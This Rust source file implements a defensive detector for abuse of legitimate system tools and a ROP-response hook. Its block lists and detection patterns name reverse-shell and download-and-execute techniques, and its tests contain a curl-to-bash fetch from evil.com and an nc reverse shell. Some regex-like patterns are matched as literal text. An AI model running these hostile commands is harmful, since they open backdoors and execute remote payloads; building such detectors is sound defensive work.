//! Living-off-the-Land (LOLBins) Detection + Kernel ROP Defense
//!
//! LOLBins: attackers use legitimate system tools maliciously
//! Examples: curl, wget, certutil, mshta, regsvr32, wmic, powershell
//! Why hard to detect: tools are legitimate, no malware binary
//!
//! Our approach:
//! 1. Context analysis: WHO called the LOLBin (parent process matters)
//! 2. Argument analysis: suspicious flags/patterns in legitimate tool usage
//! 3. Network correlation: LOLBin calling home right after launch
//! 4. Time correlation: LOLBin used within seconds of suspicious event
//!
//! Kernel ROP Defense (userspace component):
//! 1. When ROP detector BPF fires, immediately SIGSTOP the process
//! 2. Capture memory for forensics before evidence destroyed
//! 3. Report to HITL with stack trace analysis

use anyhow::Result;
use serde::{Deserialize, Serialize};
use std::collections::{HashMap, HashSet};
use std::sync::Arc;
use parking_lot::RwLock;
use tracing::{info, warn, error};

/// Known LOLBins — legitimate binaries abused by attackers
/// Source: LOLBAS project (lolbas-project.github.io) + GTFOBins
static LOLBINS: &[(&str, &str, u8)] = &[
    // (binary_name, abuse_description, base_confidence)
    ("curl",       "Data exfiltration / payload download",    60),
    ("wget",       "Payload download / C2 communication",     60),
    ("nc",         "Network backdoor / reverse shell",        85),
    ("ncat",       "Network backdoor (Nmap version)",         85),
    ("python",     "Script execution / payload loading",      55),
    ("python3",    "Script execution / payload loading",      55),
    ("perl",       "Script execution (rarely used benignly)", 65),
    ("ruby",       "Script execution",                        65),
    ("bash",       "Shell spawned by non-interactive process",50),
    ("sh",         "Shell spawned by server process",         55),
    ("dd",         "Data manipulation / disk read/write",     70),
    ("base64",     "Encoding/decoding payloads",              65),
    ("xxd",        "Hex encoding / payload manipulation",     70),
    ("openssl",    "Encrypted payload / certificate abuse",   60),
    ("socat",      "Persistent reverse shell",                90),
    ("mkfifo",     "Named pipe for shell persistence",        80),
    ("at",         "Task scheduling for persistence",         75),
    ("crontab",    "Persistence via cron",                    70),
    ("chmod",      "Making files executable (+x on /tmp/)",   65),
    ("chattr",     "Hiding malicious files (immutable)",      75),
    ("LD_PRELOAD", "Shared library injection",                90),
];

static SUSPICIOUS_LOLBIN_PATTERNS: &[(&str, &str, u8)] = &[
    // Pattern in arguments → description → confidence boost
    ("-c 'bash -i'",     "Interactive shell via command arg",     30),
    ("/dev/tcp/",        "TCP redirect in shell",                  40),
    ("/tmp/",            "Execution from /tmp",                    20),
    ("/dev/shm/",        "Execution from /dev/shm",               25),
    ("base64 -d",        "Decoding base64 payload",               20),
    ("|bash",            "Pipeline to shell (fileless exec)",     35),
    ("|sh",              "Pipeline to shell",                     35),
    (">/dev/null 2>&1",  "Suppressing output (stealth)",         15),
    ("chmod +x /tmp/",   "Making /tmp executable",                25),
    ("curl.*|bash",      "Download and execute (curL|bash)",      40),
    ("wget.*-O-.*|bash", "Download and execute (wget|bash)",      40),
];

/// LOLBin detection result
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LolBinAlert {
    pub pid: u32,
    pub binary: String,
    pub cmdline: String,
    pub parent_process: String,
    pub confidence: u8,
    pub abuse_description: String,
    pub matched_patterns: Vec<String>,
    pub recommendation: String,
}

/// ROP event from eBPF detector
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RopAlert {
    pub pid: u32,
    pub confidence: u8,
    pub gadget_count: u32,
    pub time_window_ms: u64,
    pub recommendation: String,
}

pub struct LolBinDetector {
    /// Cache of confirmed LOLBin processes (pid → alert)
    active_alerts: Arc<RwLock<HashMap<u32, LolBinAlert>>>,
    /// Allowlisted processes (e.g., backup scripts that legitimately use curl)
    allowlist: HashSet<String>,
}

impl LolBinDetector {
    pub fn new() -> Self {
        let mut allowlist = HashSet::new();
        // Common legitimate uses
        allowlist.insert("backup.sh".to_string());
        allowlist.insert("health_check.sh".to_string());
        allowlist.insert("deploy.sh".to_string());
        info!("🔍 LolBinDetector: {} LOLBins monitored, {} allowlisted", LOLBINS.len(), allowlist.len());
        Self { active_alerts: Arc::new(RwLock::new(HashMap::new())), allowlist }
    }

    /// Analyze a process for LOLBin abuse
    pub fn analyze_process(&self, pid: u32, binary: &str, cmdline: &str, parent: &str) -> Option<LolBinAlert> {
        // Check allowlist
        if self.allowlist.contains(binary) || self.allowlist.contains(parent) {
            return None;
        }

        // Find if this is a known LOLBin
        let binary_name = std::path::Path::new(binary)
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or(binary);

        let lolbin = LOLBINS.iter().find(|(name, _, _)| *name == binary_name)?;

        let mut confidence = lolbin.2;
        let mut patterns = Vec::new();
        let abuse_desc = lolbin.1.to_string();

        // Check for suspicious argument patterns
        for (pattern, desc, boost) in SUSPICIOUS_LOLBIN_PATTERNS {
            if cmdline.contains(pattern) {
                confidence = (confidence + boost).min(99);
                patterns.push(desc.to_string());
            }
        }

        // Context: if parent is a webserver, that's MORE suspicious
        if parent.contains("apache") || parent.contains("nginx") || parent.contains("php") {
            confidence = (confidence + 25).min(99);
            patterns.push("Spawned by web server (webshell indicator)".to_string());
        }

        // Context: if running from /tmp or /dev/shm, very suspicious
        if cmdline.starts_with("/tmp/") || cmdline.starts_with("/dev/shm/") {
            confidence = (confidence + 30).min(99);
            patterns.push("Executed from world-writable directory".to_string());
        }

        if confidence < 55 && patterns.is_empty() {
            return None;  // Below threshold, probably legitimate
        }

        let alert = LolBinAlert {
            pid, binary: binary.to_string(), cmdline: cmdline.to_string(),
            parent_process: parent.to_string(), confidence,
            abuse_description: abuse_desc,
            matched_patterns: patterns,
            recommendation: format!(
                "LOLBin abuse detected: '{}'. Confidence={}%. {} Recommend: quarantine PID {} and review parent process '{}'.",
                binary_name, confidence,
                if confidence > 80 { "Immediate action required." } else { "Monitor closely." },
                pid, parent
            ),
        };

        warn!("🚨 LOLBin: {} (pid={}) conf={}% parent={}", binary_name, pid, confidence, parent);
        self.active_alerts.write().insert(pid, alert.clone());
        Some(alert)
    }

    /// Process ROP detection event from eBPF
    pub async fn handle_rop_event(&self, pid: u32, confidence: u8, gadget_count: u32) -> RopAlert {
        error!("💥 ROP chain detected: pid={} confidence={}% gadgets={}", pid, confidence, gadget_count);

        // IMMEDIATE: SIGSTOP the process to preserve forensic evidence
        // (before it can destroy stack frames or overwrite memory)
        if confidence >= 80 {
            use nix::sys::signal::{kill, Signal};
            use nix::unistd::Pid;
            match kill(Pid::from_raw(pid as i32), Signal::SIGSTOP) {
                Ok(_) => info!("🔒 ROP: SIGSTOP applied to PID {} — forensic state preserved", pid),
                Err(e) => warn!("⚠️ ROP: SIGSTOP failed for PID {}: {}", pid, e),
            }
        }

        RopAlert {
            pid, confidence, gadget_count,
            time_window_ms: 0,
            recommendation: format!(
                "ROP chain detected in PID {} (confidence={}%, {} gadgets). \
                 Process frozen (SIGSTOP). Collect memory forensics immediately. \
                 Likely kernel privilege escalation in progress.",
                pid, confidence, gadget_count
            ),
        }
    }

    pub fn list_active_alerts(&self) -> Vec<LolBinAlert> {
        self.active_alerts.read().values().cloned().collect()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_detect_curl_pipe_bash() {
        let detector = LolBinDetector::new();
        let alert = detector.analyze_process(1234, "/usr/bin/curl",
            "curl http://evil.com/payload.sh|bash", "bash");
        assert!(alert.is_some());
        let a = alert.unwrap();
        assert!(a.confidence > 80, "curl|bash should have high confidence");
    }

    #[test]
    fn test_nc_reverse_shell() {
        let detector = LolBinDetector::new();
        let alert = detector.analyze_process(5678, "/bin/nc",
            "nc -e /bin/bash 192.168.1.100 4444", "apache2");
        assert!(alert.is_some());
        let a = alert.unwrap();
        assert!(a.confidence > 85, "nc from apache should be critical");
        assert!(a.matched_patterns.iter().any(|p| p.contains("web server")));
    }

    #[test]
    fn test_allowlist_respected() {
        let detector = LolBinDetector::new();
        let alert = detector.analyze_process(9999, "/usr/bin/curl",
            "curl https://api.example.com/health", "backup.sh");
        assert!(alert.is_none(), "Allowlisted parent should not trigger alert");
    }
}
